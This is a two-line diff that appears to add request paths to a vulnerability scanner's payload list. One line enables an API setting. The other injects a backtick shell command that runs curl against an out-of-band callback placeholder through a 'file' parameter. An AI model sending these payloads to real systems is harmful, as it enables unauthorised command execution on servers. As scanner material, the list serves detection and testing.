@@ -1,0 +1,2 @@
+/access/set?param=enableapi&value=1
+/service.pdfs/confluence?lang=en&file=`curl+{{interactsh-url}}`
